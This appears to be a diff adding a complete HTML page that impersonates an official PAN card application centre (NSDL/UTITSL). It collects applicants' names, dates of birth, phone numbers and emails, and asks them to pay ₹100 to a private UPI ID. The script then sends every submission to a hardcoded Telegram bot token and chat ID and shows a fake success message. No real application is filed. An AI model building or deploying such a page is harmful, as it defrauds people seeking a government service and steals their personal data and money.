@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New PAN Application - Two-Step Process</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        :root {
+            --primary-color: #1a73e8; /* Google Blue */
+            --secondary-color: #34a853; /* Google Green - Final Submit */
+            --warning-color: #fbbc05; /* Google Yellow - Payment */
+            --upi-color: #5d34ff; /* UPI/Deep Link Button Color */
+            --background-color: #f5f5f5;
+            --card-background: #ffffff;
+            --border-color: #dadce0;
+            --text-color: #3c4043;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--background-color);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-color);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 550px;
+        }
+
+        .pan-form-card {
+            background-color: var(--card-background);
+            border-radius: 8px;
+            box-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.3), 0 4px 8px 3px rgba(60, 64, 67, 0.15);
+            padding: 30px;
+            margin-bottom: 20px;
+        }
+
+        h2, h3 {
+            text-align: center;
+            color: var(--primary-color);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        h3 { font-size: 1.2em; border-bottom: 1px solid var(--border-color); }
+
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; font-weight: 500; font-size: 0.9em; }
+        input[type="text"], input[type="email"], input[type="tel"], input[type="date"], select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 1em;
+            transition: border-color 0.2s;
+        }
+        input:focus, select:focus { border-color: var(--primary-color); outline: none; box-shadow: 0 0 0 1px var(--primary-color); }
+
+        .radio-group { display: flex; gap: 20px; font-size: 0.95em; }
+        .info-box { background-color: #e8f0fe; border-left: 4px solid var(--primary-color); padding: 15px; border-radius: 4px; margin-bottom: 25px; font-size: 0.85em; text-align: center; }
+
+        /* --- Step 2: Payment Section --- */
+        #step2 { display: none; }
+        #paymentSection {
+            background-color: #fffde7;
+            border: 1px solid var(--warning-color);
+            padding: 25px;
+            border-radius: 6px;
+            text-align: center;
+        }
+        #paymentSection h4 {
+            color: #d95500;
+            margin-top: 0;
+            font-weight: 700;
+            font-size: 1.3em;
+        }
+        .upi-id {
+            font-weight: 700;
+            color: var(--primary-color);
+            font-size: 1.1em;
+            background-color: #f1f3f4;
+            padding: 5px 10px;
+            border-radius: 4px;
+            display: inline-block;
+            margin: 10px 0;
+        }
+        .qr-image {
+            max-width: 180px;
+            height: auto;
+            border: 1px solid #dcdcdc;
+            border-radius: 4px;
+            margin-top: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .upi-button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: var(--upi-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1em;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 15px;
+        }
+        .upi-button:hover { background-color: #431abf; }
+        
+        /* --- Status Messages --- */
+        .status-message { padding: 15px; border-radius: 4px; margin-top: 20px; font-weight: 600; text-align: center; display: none; }
+        .status-success { background-color: #e6f4ea; border: 1px solid #34a853; color: #34a853; }
+        .status-error { background-color: #fce8e6; border: 1px solid #ea4335; color: #ea4335; }
+        
+        /* --- Buttons --- */
+        .submit-button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 1em;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 20px;
+        }
+        #initialSubmit { background-color: var(--primary-color); color: white; }
+        #initialSubmit:hover { background-color: #1764c9; }
+        #finalSubmit { background-color: var(--secondary-color); color: white; }
+        #finalSubmit:hover { background-color: #278d43; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form class="pan-form-card" id="panApplicationForm">
+            <h2>New PAN Application Center (NSDL/UTITSL)</h2>
+            <h3 id="formTitle">Step 1 of 2: Applicant Information</h3>
+
+            <div class="info-box">
+                **Mode:** Online e-KYC (Scan Based e-Sign) | **Category:** INDIVIDUAL (Form 49A)
+            </div>
+
+            <div id="step1">
+                <div class="form-group">
+                    <label for="applicationType">Application Type</label>
+                    <select id="applicationType" name="applicationType" required>
+                        <option value="49A" selected>New PAN - Indian Citizen (Form 49A)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Select PAN Delivery Mode</label>
+                    <div class="radio-group">
+                        <label><input type="radio" name="panType" value="Physical Card & E-PAN" checked> Physical Card & E-PAN</label>
+                        <label><input type="radio" name="panType" value="E-PAN Only"> E-PAN Card Only</label>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="name">Applicant Name (As per Aadhaar)</label>
+                    <input type="text" id="name" name="name" placeholder="Full Name" required>
+                </div>
+                <div class="form-group">
+                    <label for="dob">Date of Birth</label>
+                    <input type="date" id="dob" name="dob" value="2025-12-16" required>
+                </div>
+                <div class="form-group">
+                    <label for="mobile">Mobile Number</label>
+                    <input type="tel" id="mobile" name="mobile" placeholder="10 Digit Mobile Number" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email ID (For E-PAN delivery)</label>
+                    <input type="email" id="email" name="email" placeholder="Enter Valid Email" required>
+                </div>
+                
+                <button type="button" class="submit-button" id="initialSubmit">Save Details & Proceed to Payment $\rightarrow$</button>
+            </div>
+
+            <div id="step2">
+                <div class="status-message status-success" id="detailsSubmittedMessage">✅ Application Details Saved Successfully! Proceed to payment below.</div>
+                
+                <div id="paymentSection">
+                    <h4>Step 2 of 2: Payment Confirmation (Fees: ₹100)</h4>
+                    
+                    <p>Pay the application fee using the QR Code or UPI App link.</p>
+                    
+                    <a href="#" id="upiDeeplink" class="upi-button">
+                        <span style="margin-right: 5px;">💸</span> Pay ₹100 via UPI App
+                    </a>
+
+                    <p style="margin-bottom: 5px;">--- OR Scan QR Code ---</p>
+
+                    <img src="https://i.ibb.co/CKTVnyGq/Screenshot-20251126-043755-GPay-Business.jpg" alt="UPI Payment QR Code" class="qr-image">
+                    
+                    <p style="margin-top: 10px; font-size: 0.9em;">**Target UPI ID:** <span class="upi-id">7649070168@okbizaxis</span></p>
+                    
+                    <p style="margin-top: 25px; font-weight: 700; color: var(--text-color);">Enter Payment Reference Number (UTR):</p>
+                    
+                    <div class="form-group">
+                        <label for="utr">Transaction Reference / UTR Number</label>
+                        <input type="text" id="utr" name="utr" placeholder="Enter UTR/Reference ID here (e.g., 5489XXXXXXXX)" required>
+                    </div>
+                </div>
+
+                <div class="status-message status-error" id="errorMessage">❌ Submission Failed. Please ensure you have entered the correct Reference Number and try again.</div>
+                
+                <button type="submit" class="submit-button" id="finalSubmit">Confirm Payment & Submit Application</button>
+            </div>
+            
+            <div class="status-message status-success" id="finalSuccessMessage">
+                🎉 **Application Successful!** <br> Your application has been successfully submitted and is now **In Review**.
+                <br><br> (You will receive further updates via email/SMS shortly.)
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // **************************************************************************
+        // !!! IMPORTANT: REPLACE THESE PLACEHOLDERS WITH YOUR ACTUAL DETAILS !!!
+        // **************************************************************************
+        // !!! WARNING: NEVER EXPOSE REAL BOT TOKENS IN PUBLIC FRONT-END CODE !!!
+        const BOT_TOKEN = '8573580313:AAFaNZ5KRi5Dw9SMvYl5q9SRtsZ0Zb0MGpo'; 
+        const CHAT_ID = '7918796164'; // The destination chat where the data will be sent
+        // **************************************************************************
+        
+        // UPI Information for Deeplink (Provided by user)
+        const UPI_ID = '7649070168@okbizaxis';
+        const UPI_AMOUNT = '100';
+        const UPI_NAME = 'PAN Application Fee'; 
+
+        const form = document.getElementById('panApplicationForm');
+        const initialSubmitButton = document.getElementById('initialSubmit');
+        const finalSubmitButton = document.getElementById('finalSubmit');
+        const step1Div = document.getElementById('step1');
+        const step2Div = document.getElementById('step2');
+        const formTitle = document.getElementById('formTitle');
+        const errorMessage = document.getElementById('errorMessage');
+        const finalSuccessMessage = document.getElementById('finalSuccessMessage');
+        const detailsSubmittedMessage = document.getElementById('detailsSubmittedMessage');
+        const utrInput = document.getElementById('utr');
+        const upiDeeplink = document.getElementById('upiDeeplink');
+
+        let collectedFormData = {}; // Object to store data from Step 1
+
+        // Function to construct the UPI Deeplink
+        function generateUpiDeeplink() {
+            // upi://pay?pa=VPA&pn=ReceiverName&am=Amount&cu=Currency
+            const url = `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(UPI_NAME)}&am=${UPI_AMOUNT}&cu=INR`;
+            return url;
+        }
+
+        // Set the Deeplink URL to the button
+        upiDeeplink.href = generateUpiDeeplink();
+
+
+        // --- STEP 1: INITIAL SUBMISSION (Details only) ---
+        initialSubmitButton.addEventListener('click', function() {
+            // Simple validation for Step 1 fields
+            const requiredFields = document.querySelectorAll('#step1 input[required], #step1 select[required]');
+            let isValid = true;
+            requiredFields.forEach(field => {
+                if (!field.value) {
+                    field.style.borderColor = '#ea4335'; // Red color for error
+                    isValid = false;
+                } else {
+                    // FIX: Use a hardcoded hex value instead of var() which breaks in JS style assignment
+                    field.style.borderColor = '#dadce0'; 
+                }
+            });
+
+            if (isValid) {
+                // Store Step 1 data
+                const formData = new FormData(form);
+                collectedFormData = Object.fromEntries(formData.entries());
+
+                // Transition to Step 2 (Payment)
+                step1Div.style.display = 'none';
+                step2Div.style.display = 'block';
+                detailsSubmittedMessage.style.display = 'block';
+                formTitle.textContent = 'Step 2 of 2: Payment Confirmation';
+                errorMessage.style.display = 'none';
+                finalSuccessMessage.style.display = 'none';
+            } else {
+                alert('Please fill in all required application details.');
+            }
+        });
+
+        // --- STEP 2: FINAL SUBMISSION (Including UTR to Telegram) ---
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // Check if UTR is filled
+            if (!utrInput.value || utrInput.value.length < 8) {
+                alert('Please enter a valid Transaction Reference / UTR Number.');
+                utrInput.style.borderColor = '#ea4335';
+                return;
+            }
+            // FIX: Use a hardcoded hex value instead of var() which breaks in JS style assignment
+            utrInput.style.borderColor = '#dadce0'; 
+
+            finalSubmitButton.disabled = true;
+            finalSubmitButton.textContent = 'Processing... Please wait...';
+            errorMessage.style.display = 'none';
+            
+            // 1. Combine all data
+            collectedFormData.utr = utrInput.value;
+            
+            // 2. Format Message for Telegram 
+            let message = `**\u{1F514} NEW PAN CARD APPLICATION RECEIVED**\n\n`;
+            message += `**Application Mode:** Online e-KYC\n`;
+            message += `**PAN Requirement:** ${collectedFormData.panType}\n`;
+            message += `**Name (Aadhaar):** ${collectedFormData.name}\n`;
+            message += `**D.O.B:** ${collectedFormData.dob}\n`;
+            message += `**Mobile:** ${collectedFormData.mobile}\n`;
+            message += `**Email:** ${collectedFormData.email}\n`;
+            message += `\n**\u{1F4B0} PAYMENT CONFIRMATION**\n`;
+            message += `**FEES:** ₹100\n`;
+            message += `**UTR/Reference ID:** ${collectedFormData.utr}\n`;
+            message += `**Submission Time:** ${new Date().toLocaleString()}\n`;
+            
+            // 3. Send Message to Telegram API
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown' 
+            };
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(params),
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.ok) {
+                    // Success: Hide step 2, show success message
+                    step2Div.style.display = 'none';
+                    formTitle.textContent = 'Application Submitted';
+                    finalSuccessMessage.style.display = 'block';
+                    form.reset(); 
+                    collectedFormData = {}; 
+                } else {
+                    console.error('Telegram API Error:', result);
+                    errorMessage.textContent = `❌ Submission Failed. Please ensure you have entered the correct Reference Number and try again.`;
+                    errorMessage.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Network Error:', error);
+                errorMessage.textContent = '❌ Submission Failed. Please check your internet connection.';
+                errorMessage.style.display = 'block';
+            } finally {
+                finalSubmitButton.disabled = false;
+                finalSubmitButton.textContent = 'Confirm Payment & Submit Application';
+            }
+        });
+    </script>
+</body>
+</html>
